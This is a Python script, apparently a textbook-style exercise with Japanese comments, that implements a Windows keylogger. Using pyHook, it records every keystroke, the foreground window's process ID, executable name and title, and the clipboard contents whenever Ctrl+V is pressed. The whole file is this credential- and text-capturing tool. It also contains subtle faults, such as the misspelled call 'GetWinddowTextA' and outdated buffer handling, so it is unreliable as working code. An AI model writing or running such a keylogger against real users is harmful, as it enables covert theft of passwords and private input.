# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # 操作中のウィンドウへのハンドルを取得
    hwnd = user32.GetForegroundWindow()

    # プロセスIDの特定
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 特定したプロセスIDの保存
    process_id = "%d" % pid.value

    # 実行ファイル名の取得
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # ウィンドウのタイトルバーの文字列を取得
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWinddowTextA(hwnd, byref(window_title), 512)
    # ヘッダーの出力
    print()
    print("[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))
    print()

    # ハンドルのクローズ
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def key_stroke(event):

    global current_window

    # 操作中のウィンドウが変わったか確認
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # 標準なキーが押下されたかチェック
    if 127 > event.Ascii > 32:
        print(chr(event.Ascii),)
    else:
        # [Ctrl+V]が押下されたならば、クリップボードのデータを取得
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print("[PASTE] - %s" % pasted_value,)
        else:
            print("[%s]" % event.Key,)

    # 登録済みの次のフックに処理を渡す
    return True


# フックマネージャーの作成と登録
k1 = pyHook.HookManager()
k1.KeyDown = key_stroke

# フックの登録と実行を継続
k1.HookKeyboard()
pythoncom.PumpMessages()